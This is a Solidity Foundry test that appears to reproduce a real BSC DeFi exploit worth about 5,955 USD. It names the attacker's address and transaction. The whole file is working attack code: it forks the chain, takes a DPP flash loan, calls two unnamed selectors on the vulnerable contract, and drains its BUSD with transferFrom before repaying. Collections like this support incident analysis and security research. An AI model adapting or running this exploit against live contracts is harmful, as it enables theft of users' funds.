// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo -- Total Lost : ~5955  USD
// TX : https://app.blocksec.com/explorer/tx/bsc/0xe1bf84b7a57498c0573361b20b16077cc933e4c47aa0821bcea5b158a60ef505
// Attacker : https://bscscan.com/address/0xab90a897cf6c56c69a4579ead3c900260dfba02d
// Attack Contract : https://bscscan.com/address/0xab90a897cf6c56c69a4579ead3c900260dfba02d
// GUY : https://x.com/DecurityHQ/status/1673708133926031360



contract Exploit is Test {
    address Vulncontract=0xAC899Ef647533E0dE91E269202f1169d7D47Ae92;
    IDPPOracle DPPOracle = IDPPOracle(0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A);
    IERC20 BUSD = IERC20(0x55d398326f99059fF775485246999027B3197955);

    function setUp() public {
        vm.createSelectFork("bsc", 29469587);
    }

    function testExploit() public {
        emit log_named_decimal_uint("[End] Attacker BUSD after exploit", BUSD.balanceOf(address(this)), 18);

        DPPOracle.flashLoan(0,1243763239827755213151683,address(this),abi.encode(address(this)));
        emit log_named_decimal_uint("[End] Attacker BUSD after exploit", BUSD.balanceOf(address(this)), 18);
    }

    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        BUSD.approve(address(Vulncontract),9999 ether);
        address(Vulncontract).call(abi.encodeWithSelector(bytes4(0xe2bbb158), 0,5955466788004705247296));
        address(Vulncontract).call(abi.encodeWithSelector(bytes4(0xc3490263), 0,5955466788004705247296));

        BUSD.transferFrom(address(Vulncontract),address(this),5955466788004705247296);

        BUSD.transfer(address(msg.sender),quoteAmount);

    }

    receive() external payable {}
}
